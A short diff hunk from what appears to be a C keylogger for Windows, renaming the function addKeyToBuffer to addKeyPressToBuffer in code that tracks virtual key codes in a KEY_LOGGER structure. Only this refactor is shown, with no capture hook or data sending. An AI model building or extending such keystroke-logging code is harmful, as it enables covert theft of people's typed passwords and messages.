@@ -60,7 +60,7 @@ BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
     return FALSE;
 }
 
-ERR_CODE addKeyToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
+ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     KEY_PAIR* kp = kLogger->keyCodes[*vkCode];
     
     if (kp == NULL) return ECODE_NULL;
